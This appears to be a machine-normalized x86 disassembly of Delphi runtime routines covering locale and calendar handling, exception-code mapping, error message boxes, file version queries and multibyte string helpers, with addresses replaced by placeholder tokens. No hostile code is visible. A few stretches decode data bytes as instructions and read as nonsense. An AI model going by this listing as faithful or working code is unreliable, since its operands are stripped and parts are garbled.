pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40afe0
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
inc ebx
sub_40afec
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b083
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ad64
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407ef0
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b08a
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40af38
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40af74
call EnumCalendarInfoA
sub_40b09c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b266
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403e54
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ad64
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407ef0
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404114
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b26d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403e78
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408644
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c10c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404374
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40411c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ea8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408644
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
inc ebx
jmp r-xdata
mov eax esi
call sub_404114
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408644
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40403c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40411c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40403c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40411c
sub_40b212
add al 0x2c
and [ ebp + 0xe ] dh
inc ebx
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b26d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403e78
retn
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408644
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c10c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404374
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40411c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408644
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
inc ebx
jmp r-xdata
mov eax esi
call sub_404114
cmp ebx eax
jle r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408644
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
add ebx 0x3
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
inc ebx
jmp r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40403c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40411c
sub_40b2d0
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b2c4
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c3a0
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408568
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ef0
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403054
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408ba0
mov eax [ ebp - 0x4 ]
call sub_408504
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404314
mov ebx eax
mov eax ebx
call sub_408504
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b458
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b2d0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ef0
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029a4
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408504
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b520
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ea8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_40b55c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b5b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408be0
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5bd
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
add esp 0xfffffff0
call sub_403428
sub_40b5bd
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_40b5dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_4059b8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_40b618
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b684
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4059b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408be0
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b68b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
add esp 0xfffffff0
call sub_403428
sub_40b68b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_40b6d8
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b738
cmp al 0xb7
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403890
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b520
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b6d8
mov edx eax
sub_40b7ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b848
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403eec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b84f
lea eax [ ebp - 0x20 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40b89c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b934
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40baef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4040c4
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4083d4
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40baf6
lea eax [ ebp - 0x170 ]
call sub_403e54
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40bb00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bbbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b89c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b520
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
push ebp
call sub_40b934
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bbc2
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
mov ebx eax
sub_40bbdc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bbcc
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b91c
mov eax [ rw-data ]
mov [ eax ] sub_40bb00
mov eax sub_40b868
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b884
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bc60
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403104
xor eax eax
mov [ rw-data ] eax
sub_40bce0
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4040c4
sub_40bd70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40be46
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403eec
lea eax [ ebp - 0x8 ]
call j_sub_404320
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404314
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be4d
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40be29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404314
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40be5c
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bed4
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404314
mov edx esi
dec edx
call sub_40be5c
sub_40bf10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404114
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bf38
pop esi
pop ebx
retn
mov eax ebx
call sub_404114
mov esi eax
sub_40bf38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404114
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c148
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bf90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404114
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c148
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c148
dec eax
mov ebx eax
sub_40c020
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404114
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bf90
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404114
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c084
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404114
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404114
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bf90
mov eax esi
call sub_404114
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404114
mov [ esp ] eax
jmp r-xdata
sub_40c10c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404314
add eax esi
dec eax
call sub_40c0e4
sub_40c148
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404314
add eax ebx
dec eax
call sub_40c0e4
add eax ebx
sub_40c184
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404114
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bed4
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c1b8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404114
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40bed4
test al al
jne r-xdata
mov eax ebp
call sub_404314
mov dl [ esi + edi - 0x1 ]
call sub_408688
test eax eax
setne bl
sub_40c1fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ea8
mov eax [ ebx ]
call sub_404114
mov edx eax
mov eax [ ebx ]
call sub_40c184
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_40411c
sub_40c23c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404314
push eax
mov eax esi
call sub_404314
mov ebp eax
mov eax ebp
pop edx
call sub_40c300
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c274
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407b9c
mov eax esi
call sub_404114
mov ebp eax
mov eax edi
mov edx ebp
call sub_4044a0
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404320#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404320#2
